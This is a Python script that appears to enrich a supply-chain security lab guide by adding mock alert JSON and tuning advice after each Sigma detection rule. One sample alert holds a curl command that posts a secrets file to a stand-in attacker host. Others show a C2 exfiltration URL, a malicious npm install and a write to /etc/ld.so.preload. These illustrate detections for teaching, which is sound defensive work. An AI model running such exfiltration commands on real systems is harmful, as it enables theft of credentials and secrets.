import os
import re
import glob
import json

LABS_DIR = "/Users/fume/weaklink-labs/guide/docs/labs"

def generate_mock_json(logsource_category, title):
    title = title.lower()
    
    if "github" in title or "gitea" in title or "gitlab" in title or "pr " in title or "ci " in title:
        return {
            "source": "github_audit",
            "action": "repository.push",
            "actor": "compromised_user_token",
            "repo": "wl-corp/internal-api",
            "changes": [".github/workflows/ci.yml", "Makefile", "scripts/build.sh"],
            "url": "https://github.com/wl-corp/internal-api/commit/abc1234",
            "message": "Update build configuration"
        }
    elif "package" in title or "npm" in title or "pip" in title:
        return {
            "source": "package_manager",
            "command": "npm install malicious-pkg",
            "user": "developer_workstation",
            "timestamp": "2024-03-29T10:00:00Z",
            "registry": "https://registry.npmjs.org",
            "error": "EINTEGRITY - checksum mismatch"
        }
    elif "container" in title or "docker" in title or "image" in title or logsource_category == "image_load":
        return {
            "source": "kubernetes_audit",
            "action": "create_pod",
            "user": "system:serviceaccount:default",
            "image": "registry:5000/webapp:latest",
            "image_digest": "sha256:unexpected_digest_here",
            "admission_controller": "rejected - signature missing"
        }
    elif logsource_category == "process_creation":
        return {
            "EventID": 4688,
            "Channel": "Security",
            "Computer": "CI-RUNNER-01",
            "ProcessName": "curl",
            "CommandLine": "curl -X POST -d @/tmp/secrets http://attacker.com/steal",
            "SubjectUserName": "runner-bot"
        }
    elif logsource_category in ["network_connection", "proxy"]:
        return {
            "timestamp": "2024-03-29T10:05:00Z",
            "src_ip": "10.0.5.15",
            "src_host": "build-node-pool3",
            "dest_ip": "198.51.100.42",
            "dest_port": 443,
            "http_method": "POST",
            "url": "http://attacker-c2.internal/exfil",
            "user_agent": "curl/7.81.0"
        }
    elif logsource_category == "file_event":
        return {
            "EventID": 11,
            "Computer": "DEV-LAPTOP-55",
            "TargetFilename": "/etc/ld.so.preload",
            "Image": "/usr/bin/python3",
            "CreationUtcTime": "2024-03-29T11:00:00Z"
        }
    else:
        # Generic fallback
        return {
            "timestamp": "2024-03-29T12:00:00Z",
            "event_type": "supply_chain_alert",
            "description": f"Triggered rule: {title}",
            "severity": "high",
            "actor": "unknown",
            "action": "suspicious_activity"
        }

def process_file(filepath):
    with open(filepath, 'r') as f:
        content = f.read()

    # Regex to find Sigma blocks: starts with **Sigma optionally some text**, then ```yaml, then content, then ```
    pattern = re.compile(r'(\*\*Sigma.*?\*\*\s*```yaml\n(?:.*?)\n\s*```\n)', re.DOTALL | re.IGNORECASE)
    
    matches = list(pattern.finditer(content))
    if not matches:
        return False
        
    new_content = content
    offset = 0
    
    for match in matches:
        block = match.group(0)
        
        # Don't add twice
        if "Sample Alert JSON & Tuning Guidance" in content[match.end():match.end()+200]:
            continue
            
        # Parse title and category from yaml via regex logic
        title_match = re.search(r'title:\s*(.+)', block, re.IGNORECASE)
        cat_match = re.search(r'category:\s*(.+)', block, re.IGNORECASE)
        
        title = title_match.group(1).strip().strip('"\'') if title_match else "Unknown Rule"
        category = cat_match.group(1).strip().strip('"\'') if cat_match else "generic"
        
        mock_json = generate_mock_json(category, title)
        
        # Generate the appending markdown
        append_md = f"""
<details>
<summary>Sample Alert JSON & Tuning Guidance</summary>

**Sample Alert Payload** (What triggers this rule)
```json
{json.dumps(mock_json, indent=2)}
```

**Tuning & False Positives**
*   **Known False Positives**: Expect noise from automated dependency updaters (e.g., Dependabot, Renovate) and developer laptops executing local builds. Legitimate CI scripts may also run network reconnaissance commands (curl/wget) during environment setup.
*   **Tuning Strategy**: Exclude known build agents and IP ranges for production dependencies. Scope the detection strictly to the `.github/workflows` or `Makefile` directories rather than global Git events. Validate signatures against an explicitly allowed list of public keys.
</details>
"""
        
        # Insert append_md right after the matched block
        insert_pos = match.end() + offset
        new_content = new_content[:insert_pos] + append_md + new_content[insert_pos:]
        offset += len(append_md)
        
    if new_content != content:
        with open(filepath, 'w') as f:
            f.write(new_content)
        return True
    return False

if __name__ == "__main__":
    count = 0
    for root, dirs, files in os.walk(LABS_DIR):
        for file in files:
            if file.endswith(".md"):
                if process_file(os.path.join(root, file)):
                    count += 1
    print(f"Added Sample Alert Context to Sigma rules in {count} lab files.")
